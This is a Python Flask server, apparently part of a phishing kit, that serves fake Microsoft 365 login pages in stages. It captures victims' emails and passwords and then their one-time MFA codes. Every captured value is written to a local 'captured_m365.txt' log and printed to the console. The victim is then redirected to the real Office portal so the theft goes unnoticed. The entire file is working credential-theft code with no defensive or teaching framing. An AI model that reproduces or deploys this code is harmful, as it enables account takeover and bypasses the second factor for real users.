from flask import Flask, request, redirect, send_file
import datetime
import os

BASE_DIR = os.path.expanduser("~/phishpages")

app = Flask(__name__)
LOG = os.path.join(BASE_DIR, "captured_m365.txt")

def log_capture(data):
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{ts}] " + " | ".join(f"{k}: {v}" for k,v in data.items())
    with open(LOG, "a") as f:
        f.write(line + "\n")
    print("\n" + "="*60)
    print(line)
    print("="*60 + "\n")

@app.route("/stage2")
@app.route("/stage2/")
def stage2_page():
    return send_file(os.path.join(BASE_DIR, "stage2", "index.html"))

@app.route("/stage2/submit", methods=["POST"])
def stage2_submit():
    email = request.form.get("email", "")
    password = request.form.get("password", "")
    log_capture({"PLATFORM": "M365", "STAGE": "PASSWORD", "Email": email, "Password": password})
    return redirect(f"/stage3?email={email}")

@app.route("/stage3")
@app.route("/stage3/")
def stage3_page():
    return send_file(os.path.join(BASE_DIR, "stage3", "index.html"))

@app.route("/stage3/submit", methods=["POST"])
def stage3_submit():
    email = request.form.get("email", "")
    password = request.form.get("password", "")
    otp = request.form.get("otp", "")
    log_capture({"PLATFORM": "M365", "STAGE": "OTP", "Email": email, "Password": password, "OTP": otp})
    return redirect("https://portal.office.com")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8081, debug=False)
